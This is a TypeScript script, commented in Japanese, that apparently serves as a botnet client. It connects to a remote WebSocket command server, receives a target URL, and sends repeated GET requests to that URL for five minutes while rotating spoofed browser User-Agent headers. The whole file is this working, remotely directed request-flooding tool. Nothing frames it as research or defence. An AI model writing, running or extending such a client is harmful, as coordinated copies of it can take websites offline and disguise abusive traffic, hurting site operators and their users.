const serverUrl = "ws://extreme4m5n.creepercloud.io:26025";

// 偽のUser-Agentリスト
const fakeUserAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
];

// 指定されたURLに対して300秒間GETリクエストを送信
async function sendGetRequests(url: string) {
  const endTime = Date.now() + 300000; // 現在時刻 + 300秒

  while (Date.now() < endTime) {
    const userAgent = fakeUserAgents[Math.floor(Math.random() * fakeUserAgents.length)];
    try {
      const response = await fetch(url, {
        method: "GET",
        headers: {
          "User-Agent": userAgent,
        },
      });
      console.log(`Response from ${url}: ${response.status}`);
    } catch (error) {
      console.error(`Failed to fetch ${url}:`, error);
    }

    // 1秒待機
    await new Promise((resolve) => setTimeout(resolve, 1000));
  }
}

// メイン関数
async function main() {
  try {
    const ws = new WebSocket(serverUrl);

    ws.onopen = () => {
      console.log("Connected to WebSocket server");
    };

    ws.onmessage = async (event) => {
      try {
        const { url } = JSON.parse(event.data);
        console.log(`Received URL: ${url}`);
        await sendGetRequests(url);
      } catch (error) {
        console.error("Invalid message from server:", error);
      }
    };

    ws.onerror = (error) => {
      console.error("WebSocket error:", error);
    };

    ws.onclose = () => {
      console.log("WebSocket connection closed");
    };
  } catch (error) {
    console.error("Failed to connect to WebSocket server:", error);
  }
}

// 実行
main();
